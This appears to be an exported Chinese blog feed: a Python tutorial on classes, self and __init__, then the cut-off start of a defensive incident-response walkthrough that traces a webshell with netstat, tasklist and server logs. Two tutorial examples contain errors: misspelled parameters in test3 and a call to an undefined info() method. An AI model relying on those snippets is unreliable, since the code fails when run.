class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猫在吃鱼....&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猫在喝可乐...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个对象</span></span><br><span class="line">tom = Cat()</span><br><span class="line">tom.eat()  <span class="comment"># 调用对象的eat方法</span></span><br><span class="line">tom.drink()</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是一个方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;age=%d&quot;</span> % age)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test3</span>(<span class="params">self, score1, socre2, socre3</span>):</span><br><span class="line">        <span class="keyword">return</span> (score1 + score2 + score3) / <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Hero类的对象</span></span><br><span class="line">hero = Hero()</span><br><span class="line">hero.test1()  <span class="comment"># test1无参无返回值</span></span><br><span class="line">hero.test2(<span class="number">19</span>)  <span class="comment"># test2需要传递实参</span></span><br><span class="line">average_score = hero.test3(<span class="number">100</span>, <span class="number">99</span>, <span class="number">98</span>)  <span class="comment"># test3需要实参，有返回值因此需要用变量来存储</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>实例方法的调用，一定要用<code>实例对象.方法名()</code>调用</li></ul><h2 id="实例属性的概念"><a href="#实例属性的概念" class="headerlink" title="实例属性的概念"></a>实例属性的概念</h2><p>什么是实例属性呢？</p><p>通俗的说：<strong>实例属性</strong>就是<strong>对象中</strong>可以用的<strong>变量</strong>，用它来存储数据</p><h2 id="实例属性的定义与使用"><a href="#实例属性的定义与使用" class="headerlink" title="实例属性的定义与使用"></a>实例属性的定义与使用</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><blockquote><p>一般实例属性都通过这种方式定义：</p><p>init魔术函数是帮助我们创建实例属性的内置方法！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">    self.name = name</span><br><span class="line">    self.age = age</span><br></pre></td></tr></table></figure></blockquote><h3 id="其他定义方式："><a href="#其他定义方式：" class="headerlink" title="其他定义方式："></a>其他定义方式：</h3><p>方式一：动态添加属性（但是不太好），一般情况不用，动态添加后对象具备该属性，同时也可以添加私有属性</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名.属性名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">hero = Hero()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给对象设置属性（通俗的说就是：给hero标记的实例对象添加变量且赋值）</span></span><br><span class="line">hero.name = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">hero.age = <span class="number">18</span></span><br><span class="line">hero.address = <span class="string">&quot;长沙&quot;</span></span><br></pre></td></tr></table></figure><p>方式二：方法添加属性</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">方法名</span>(<span class="params">self</span>):</span><br><span class="line">        self.实例属性名 = 数据</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 下面定义的了3个实例属性，且给它们设置了初始值</span></span><br><span class="line">        self.name = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        self.address = <span class="string">&quot;长沙&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例对象</span></span><br><span class="line">hero = Hero()</span><br><span class="line"><span class="comment"># 调用方法，从而让第4、5、6行被执行，从而完成实例对象的属性添加</span></span><br><span class="line">hero.set_info()</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>这种方式定义的实例属性，需要调用它所在的方法才行，如果方法不调用那么定义的属性就不会被执行，因此对象就不会有这些属性</li></ul><h3 id="更加灵活的使用属性"><a href="#更加灵活的使用属性" class="headerlink" title="更加灵活的使用属性"></a>更加灵活的使用属性</h3><p>虽然定义与使用属性有上述2种方式，但是实际开发工作中，是互相用的，没有人规定我们必须用哪一种，只要能实现需求即可</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 下面定义的了3个实例属性，且给它们设置了初始值</span></span><br><span class="line">        self.name = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        self.address = <span class="string">&quot;长沙&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.qq, self.email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例对象</span></span><br><span class="line">hero = Hero()</span><br><span class="line"><span class="comment"># 调用方法，从而让第4、5、6行被执行，从而完成实例对象的属性添加</span></span><br><span class="line">hero.set_info()</span><br><span class="line"><span class="comment"># 通过对象方式直接获取属性</span></span><br><span class="line"><span class="built_in">print</span>(hero.name, hero.age, hero.address)</span><br><span class="line"><span class="comment"># 给对象添加额外的属性</span></span><br><span class="line">hero.qq = <span class="number">123456</span></span><br><span class="line">hero.email = <span class="string">&quot;wt_poppies@sina.com&quot;</span></span><br><span class="line"><span class="comment"># 调用方法，在方法中获取qq、email</span></span><br><span class="line">hero.print_info()</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>虽然上述的代码中展示了我们使用属性的灵活性，但也总感觉代码有些凌乱，所以后面我们将属性的定义都放到<code>__init__</code>方法中</li></ul><h2 id="简单总结-2"><a href="#简单总结-2" class="headerlink" title="简单总结"></a>简单总结</h2><ul><li>用类创建出来的对象，我们一般称之为“实例对象”</li><li>实例方法，就是对象中的函数，实现了功能</li><li>实例属性，就是对象中的变量，实现了存储数据</li></ul><h1 id="类中的self"><a href="#类中的self" class="headerlink" title="类中的self"></a>类中的<code>self</code></h1><h2 id="理解给对象添加属性"><a href="#理解给对象添加属性" class="headerlink" title="理解给对象添加属性"></a>理解给对象添加属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 下面定义的了3个实例属性，且给它们设置了初始值</span></span><br><span class="line">        self.name = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        self.address = <span class="string">&quot;长沙&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.qq, self.email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例对象</span></span><br><span class="line">hero = Hero()</span><br><span class="line"><span class="comment"># 调用方法，从而让第4、5、6行被执行，从而完成实例对象的属性添加</span></span><br><span class="line">hero.set_info()</span><br><span class="line"><span class="comment"># 通过对象方式直接获取属性</span></span><br><span class="line"><span class="built_in">print</span>(hero.name, hero.age, hero.address)</span><br><span class="line"><span class="comment"># 给对象添加额外的属性</span></span><br><span class="line">hero.qq = <span class="number">123456</span></span><br><span class="line">hero.email = <span class="string">&quot;wt_poppies@sina.com&quot;</span></span><br><span class="line"><span class="comment"># 调用方法，在方法中获取qq、email</span></span><br><span class="line">hero.print_info()  <span class="comment"># 这句话等同于print_info(hreo)</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>创建对象后，变量<code>hero</code>指向了一个空间，这个空间可以理解为对象空间</li><li>对象中可以存放添加了所有的属性</li></ul><h2 id="实例方法获取实例属性"><a href="#实例方法获取实例属性" class="headerlink" title="实例方法获取实例属性"></a>实例方法获取实例属性</h2><p>当类名 + <code>()</code>表示对类进行了实例化，会在内存中存储类中的代码，并把存储的地址赋值给<code>hreo</code>这个变量，当前这个变量我们也称作实例对象。当使用<code>实例对象.实例方法()</code>时，当前方法会在内存中寻找之前定义的属性并打印。</p><ul><li><code>实例对象.实例方法()</code>就相当于<code>实例方法(实例对象)</code></li><li>定义实例方法的时候，之所以第一个形参一定是<code>self</code>就是因为，当我们调用实例方法的时候Python解释器会自动将这个对象的引用当做第一个实参</li></ul><h2 id="self的作用"><a href="#self的作用" class="headerlink" title="self的作用"></a><code>self</code>的作用</h2><p>通过上述的学习，大家能够看出，<code>self</code>的作用就是当通过实例对象调用方法的时候<code>self</code>能够自动指向实例对象，从而拥有了操作这个对象中的属性或者方法的可能。</p><p>实例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self, new_name, new_age</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在吃鱼....&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在喝可乐...&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名字是:%s, 年龄是:%d&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">tom = Cat()</span><br><span class="line"><span class="comment"># 调用方法，设置属性</span></span><br><span class="line">tom.set_info(<span class="string">&quot;汤姆猫&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.print_info()</span><br></pre></td></tr></table></figure><p>代码说明：</p><ol><li><code>Cat()</code>创建了实例对象并把这个对象的地址赋值给了<code>tom</code></li><li><code>tom.set_info(&#39;汤姆猫&#39;, 30)</code>相当于使用<code>set_info()</code>方法在指定的内存中创建了两个属性</li></ol><h2 id="案例：多个实例对象"><a href="#案例：多个实例对象" class="headerlink" title="案例：多个实例对象"></a>案例：多个实例对象</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self, new_name, new_age</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在吃鱼....&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在喝可乐...&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名字是:%s, 年龄是:%d&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象tom</span></span><br><span class="line">tom = Cat()</span><br><span class="line"><span class="comment"># 调用方法，设置属性</span></span><br><span class="line">tom.set_info(<span class="string">&quot;汤姆猫&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.print_info()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象jia_fei</span></span><br><span class="line">jia_fei = Cat()</span><br><span class="line"><span class="comment"># 调用方法，设置属性</span></span><br><span class="line">jia_fei.set_info(<span class="string">&quot;加菲猫&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">jia_fei.eat()</span><br><span class="line">jia_fei.drink()</span><br><span class="line">jia_fei.print_info()</span><br></pre></td></tr></table></figure><p>代码说明：</p><ol><li><code>Cat()</code>创建了实例对象并把这个对象的地址赋值给了<code>tom</code></li><li><code>tom.set_info(&#39;汤姆猫&#39;, 30)</code>相当于使用<code>set_info()</code>方法在指定的内存中创建了两个属性</li><li>在创建<code>tom</code>后由再次创建了<code>jia_fei</code>,并且<code>jia_fei</code>这个变量存储了一个新的对象的引用地址</li><li>使用<code>jia_fei</code>调用类中的相关方法与属性</li></ol><h2 id="简单总结-3"><a href="#简单总结-3" class="headerlink" title="简单总结"></a>简单总结</h2><ul><li>所谓的<code>self</code>，可以理解为自己，<code>谁调用方法中的self就指向谁</code></li><li>可以把<code>self</code>当做<code>C++编程语言</code>中类里面的<code>this</code>指针一样理解，就是对象自身的意思</li><li>某个对象调用其方法时，<code>python</code>解释器会把这个对象作为第一个参数传递给<code>self</code>，所以开发者只需要传递后面的参数即可</li><li><code>self</code>仅仅是一个变量名，也可将<code>self</code>换为其他任意的名字，但是为了能够让其他开发人员能明白这变量的意思，因此一般都会self当做名字</li></ul><h1 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__方法"></a><code>__init__</code>方法</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>回顾上一节学习<code>self</code>时代码，如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">self, new_name, new_age</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在吃鱼....&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在喝可乐...&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名字是:%s, 年龄是:%d&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象tom</span></span><br><span class="line">tom = Cat()</span><br><span class="line"><span class="comment"># 调用方法，设置属性</span></span><br><span class="line">tom.set_info(<span class="string">&quot;汤姆猫&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.print_info()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象jia_fei</span></span><br><span class="line">jia_fei = Cat()</span><br><span class="line"><span class="comment"># 调用方法，设置属性</span></span><br><span class="line">jia_fei.set_info(<span class="string">&quot;加菲猫&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">jia_fei.eat()</span><br><span class="line">jia_fei.drink()</span><br><span class="line">jia_fei.print_info()</span><br></pre></td></tr></table></figure><p>通过上述的代码，我们发现想要让对象拥有<code>name</code>、<code>age</code>属性，就必须要调用<code>set_info</code>方法，那是否可以更加简单点呢？毕竟我们知道定义变量时，可以顺便给它默认值；那创建对象时能否让它默认执行某个方法完成属性的设置呢？</p><p>答：可以</p><h2 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h2><p>创建对象后，Python会<strong>自动调用一个特殊的方法</strong>名字叫<code>__init__</code>，一般情况下我们会在这个方法中完成对象属性的设置~</p><p><strong>实际上就是初始化对象</strong>，<strong>构造方法</strong></p><p>定义示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>注意，<code>__init__</code>方法会在对象创建完毕后，自动调用，无需我们自己调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我是__init__方法&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat = Cat()  <span class="comment"># 此时就会自动调用</span></span><br></pre></td></tr></table></figure><h2 id="创建对象的过程"><a href="#创建对象的过程" class="headerlink" title="创建对象的过程"></a>创建对象的过程</h2><p>注意，一般情况下我们会在这个方法中完成对象属性的设置，示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, new_name, new_age</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在吃鱼....&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s在喝可乐...&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名字是:%s, 年龄是:%d&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象tom</span></span><br><span class="line">tom = Cat(<span class="string">&quot;汤姆猫&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.print_info()</span><br></pre></td></tr></table></figure><p>说明</p><ul><li><code>__init__()</code>方法，在创建一个对象时默认被调用，不需要手动调用</li><li><code>__init__(self)</code>中的self参数，不需要开发者传递，python解释器会自动把当前的对象引用传递过去</li></ul><p>上述代码执行过程：</p><ol><li><code>Cat(&quot;汤姆猫&quot;, 30)</code>创建对象并把对象的内存地址赋值给<code>tom</code></li><li>当对象创建时自动调用<code>__init__</code>方法，当前方法中的<code>self</code>指向<code>tom</code>这个变量所存储的地址，并使用<code>self</code>创建属性</li><li>因为<code>tom</code>这个变量与<code>self</code>指向的是同一个地址，所以<code>tom</code>也具有了<code>name</code>和<code>age</code>这两个属性</li></ol><h2 id="init-案例"><a href="#init-案例" class="headerlink" title="__init__案例"></a><code>__init__</code>案例</h2><p>案例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;定义了一个英雄类，可以移动和攻击&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, new_name, new_hp, new_atk, new_armor</span>):</span><br><span class="line">        self.name = new_name  <span class="comment"># 姓名</span></span><br><span class="line">        self.hp = new_hp  <span class="comment"># 生命值</span></span><br><span class="line">        self.atk = new_atk  <span class="comment"># 攻击力</span></span><br><span class="line">        self.armor = new_armor  <span class="comment"># 护甲值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在前往事发地点...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发出了一招强力的普通攻击...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化了一个英雄对象，并自动调用__init__()方法</span></span><br><span class="line">taidamier = Hero(<span class="string">&quot;程咬金&quot;</span>, <span class="number">1900</span>, <span class="number">900</span>, <span class="number">800</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过.成员选择运算符，获取对象的实例方法</span></span><br><span class="line">taidamier.info()  <span class="comment"># 只需要调用实例方法info()，即可获取英雄的属性</span></span><br><span class="line">taidamier.move()</span><br><span class="line">taidamier.attack()</span><br></pre></td></tr></table></figure><p>案例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;定义了一个英雄类，可以移动和攻击&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, new_name, new_skill, new_hp, new_atk, new_armor</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.skill = new_skill</span><br><span class="line">        self.hp = new_hp</span><br><span class="line">        self.atk = new_atk</span><br><span class="line">        self.armor = new_armor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;实例方法&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 正在前往事发地点...&quot;</span> % self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;实例方法&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发出了一招强力的%s...&quot;</span> % self.skill)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;英雄 %s 的生命值 :%d&quot;</span> % (self.name, self.hp))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;英雄 %s 的攻击力 :%d&quot;</span> % (self.name, self.atk))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;英雄 %s 的护甲值 :%d&quot;</span> % (self.name, self.armor))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化英雄对象时，参数会传递到对象的__init__()方法里</span></span><br><span class="line">taidamier = Hero(<span class="string">&quot;泰达米尔&quot;</span>, <span class="string">&quot;旋风斩&quot;</span>, <span class="number">2600</span>, <span class="number">450</span>, <span class="number">200</span>)</span><br><span class="line">gailun = Hero(<span class="string">&quot;盖伦&quot;</span>, <span class="string">&quot;大宝剑&quot;</span>, <span class="number">4200</span>, <span class="number">260</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用对象方法</span></span><br><span class="line">taidamier.attack()</span><br><span class="line">taidamier.move()</span><br><span class="line">gailun.move()</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>通过一个类，可以创建多个对象，就好比 通过一个模具创建多个实体一样</li><li><code>__init__(self)</code>中，默认有1个参数名字为self，如果在创建对象时传递了2个实参，那么<code>__init__(self)</code>中出了self作为第一个形参外还需要2个形参，例如<code>__init__(self,x,y)</code></li></ul><p>注意点：</p><ol><li>在类内部获取 属性 和 实例方法，通过<code>self</code>获取</li><li>在类外部获取 属性 和 实例方法，通过对象名获取</li><li>如果一个类有多个对象，每个对象的属性是各自保存的，都有各自独立的地址</li><li>但是实例方法是所有对象共享的，只占用一份内存空间。类会通过<code>self</code>来判断是哪个对象调用了实例方法</li></ol><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应</title>
      <link href="/%E8%93%9D%E9%98%9F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html"/>
      <url>/%E8%93%9D%E9%98%9F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="应急响应案例演示"><a href="#应急响应案例演示" class="headerlink" title="应急响应案例演示"></a>应急响应案例演示</h1><h2 id="案例2：WEB攻击应急响应溯源-后门-日志"><a href="#案例2：WEB攻击应急响应溯源-后门-日志" class="headerlink" title="案例2：WEB攻击应急响应溯源-后门,日志"></a>案例2：WEB攻击应急响应溯源-后门,日志</h2><blockquote><p>故事回顾：某客户反映自己的网站首页出现篡改，请求支援<br>分析：涉及的攻击面，涉及的操作权限，涉及的攻击意图，涉及的攻击方式等</p><ul><li>思路1：利用日志定位修改时间(依据是被修改的文件，比如说主页），将前时间进行攻击分析，后时间进行操作分析</li><li>思路2：利用后门webshell查杀脚本或工具找到对应后门文件，定位第一次时间分析</li></ul><p>几个关键字就是：<strong>日志、修改时间、定位后门文件</strong></p></blockquote><p>站在攻击者的角度，去分析。攻击者当前拿到哪些权限，网站还是系统权限。装没装杀软，用渗透者的思路去想问题。注重信息搜集，从攻击面入手查看应急响应。</p><p>案例演示</p><p>&lt;1&gt;执行<code>netstat -ano</code>命令，通过开放的端口找到对应的PID。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135642.png" alt="img"></p><p>&lt;2&gt;执行<code>tasklist -svc</code>命令，通过PID找到对应的进程名称。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135660.png" alt="img"></p><p>&lt;3&gt;在任务管理器，右击进程名称，选择打开文件位置。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135741.png" alt="img"></p><p>直接定位到具体位置</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135790.png" alt="img"></p><p>&lt;4&gt;根据不同的服务名，找寻对应的日志存储目录。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135626.png" alt="img"></p><p>&lt;5&gt;打开日志，分析异常操作，发现有人上传了x.php文件。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135000.png" alt="img" style="zoom:50%;" /><p>&lt;6&gt;通过网站目录找到x.php</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135705.png" alt="img"></p><p>&lt;7&gt;打开看一下，是后门文件。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135777.png" 